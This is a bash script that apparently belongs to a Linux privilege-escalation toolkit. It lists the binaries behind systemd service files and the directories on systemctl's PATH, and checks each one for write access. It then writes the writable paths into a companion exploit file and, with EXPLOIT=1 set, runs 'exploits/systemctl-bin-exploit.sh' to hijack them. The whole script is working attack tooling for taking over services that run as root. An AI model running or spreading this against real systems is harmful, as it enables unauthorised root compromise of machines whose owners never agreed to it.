#! /bin/bash

EXPLOIT=1

curr_dir=$(pwd)

# get locations of the .service files
dirs=$(systemctl show | grep UnitPath | sed 's/.*=//g')

services=''
execs=''

for dir in $dirs; do
	# if it is a directory and not a file, cd into it and find all .service files within
	#echo $dir
	if [[ -d "$dir" ]]; then
		cd "$dir"
		for file in *; do
			# echo $file
			# if the file's extension is '.service', then add it to the list
                        if [[ "${file: -8}" == ".service" ]]; then
                                services+=${dir}/${file}$'\n'
				execs+=$(cat ${file} 2>/dev/null | grep -oP "^Exec(?:Start|Stop)=[-+@!\s]*\K/(.*)$")$'\n' 
                        fi
                done
	fi
done 

# remove blank lines
execs=$(echo "${execs}" | sed '/^\s*$/d' | awk '{ print $1 }' | sort | uniq)

# echo "${execs}"

writable_bins=''

for bin in ${execs}; do
	writable=$(check_writable "$bin" "$EXPLOIT")
	if [[ "$writable" = true ]]; then
		writable_bins+=$bin':'
	fi
done


# running this command will define a PATH variable
# containing directories where systemctl binaries are stored,
# separated by colons
eval $(systemctl show-environment) 

writable_dirs=''

# loop through each directory in the PATH variable
for dir in ${PATH//:/ }; do
	# if we have write access to the directory,
	# loop through each file within the directory
	# keeping track of writable files

	writable=$(check_writable "$dir" "$EXPLOIT")
	if [[ "$writable" = true ]]; then
		writable_dirs+=$dir$'\n'
	fi
done

for dir in $writable_dirs; do
	cd "$dir"
	for file in *; do
		if [[ -f "$file" ]]; then
			writable=$(check_writable "$file" "$EXPLOIT")
			if [[ "$writable" = true ]]; then
				writable_bins+=${dir}/${file}':'
			fi
		fi
	done
done

cd $curr_dir

# writes the exploitable files to the correct exploit file
sed -i "s#EXPLOITABLE\=.*#EXPLOITABLE\=${writable_bins}#g" exploits/systemctl-bin-exploit.sh

if [[ "$EXPLOIT" = 1 ]]; then
        /bin/bash exploits/systemctl-bin-exploit.sh
fi
